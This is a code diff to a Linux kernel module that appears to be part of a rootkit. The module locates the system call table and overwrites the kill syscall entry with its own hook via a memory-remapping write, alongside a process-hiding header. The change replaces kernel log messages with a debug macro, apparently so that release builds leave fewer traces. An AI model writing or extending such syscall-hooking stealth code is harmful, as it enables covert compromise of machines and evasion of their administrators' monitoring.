@@ -6,6 +6,7 @@
 #include "hide_proc.h"
 #include "inline_hook/p_lkrg_main.h"
 #include "inline_hook/utils/p_memory.h"
+#include "version_control.h"
 
 // Storage for the original sys_kill function pointer
 // The actual sys_kill function takes pid and sig, not pt_regs.
@@ -30,46 +31,46 @@ static asmlinkage long hooked_sys_kill(pid_t pid, int sig)
     }
 
     // Fallback if original_sys_kill is NULL
-    printk(KERN_WARNING "[hide_kill] original_sys_kill is NULL!\n");
+    PRINT_DEBUG("[hide_kill] original_sys_kill is NULL!\n");
     return -ENOSYS;
 }
 
 int hide_kill_init(void)
 {
     void *new_kill_ptr = &hooked_sys_kill;
-    printk(KERN_INFO "[hide_kill] Initializing kill hook.\n");
+    PRINT_DEBUG("[hide_kill] Initializing kill hook.\n");
 
     p_sys_call_table = (unsigned long **)get_sys_call_table();
     if (!p_sys_call_table) {
-        printk(KERN_ERR "[hide_kill] Failed to get sys_call_table address.\n");
+        PRINT_DEBUG("[hide_kill] Failed to get sys_call_table address.\n");
         return -EFAULT;
     }
 
-    printk(KERN_INFO "[hide_kill] Found sys_call_table at %%px\n", p_sys_call_table);
+    PRINT_DEBUG("[hide_kill] Found sys_call_table at %%px\n", p_sys_call_table);
 
     // Backup the original pointer
     original_sys_kill = (void *)p_sys_call_table[__NR_kill];
 
     // Write our hook function's address to the table
     if (remap_write_range(&p_sys_call_table[__NR_kill], &new_kill_ptr, sizeof(void *), true)) {
-        printk(KERN_ERR "[hide_kill] Failed to hook sys_kill.\n");
+        PRINT_DEBUG("[hide_kill] Failed to hook sys_kill.\n");
         return -EFAULT;
     }
 
-    printk(KERN_INFO "[hide_kill] Successfully hooked sys_kill.\n");
+    PRINT_DEBUG("[hide_kill] Successfully hooked sys_kill.\n");
     return 0;
 }
 
 void hide_kill_exit(void)
 {
-    printk(KERN_INFO "[hide_kill] Exiting kill hook.\n");
+    PRINT_DEBUG("[hide_kill] Exiting kill hook.\n");
 
     if (p_sys_call_table && original_sys_kill) {
         // Restore the original pointer
         if (remap_write_range(&p_sys_call_table[__NR_kill], &original_sys_kill, sizeof(void *), true)) {
-            printk(KERN_ERR "[hide_kill] Failed to restore sys_kill.\n");
+            PRINT_DEBUG("[hide_kill] Failed to restore sys_kill.\n");
         } else {
-            printk(KERN_INFO "[hide_kill] Successfully restored sys_kill.\n");
+            PRINT_DEBUG("[hide_kill] Successfully restored sys_kill.\n");
         }
     }
 }
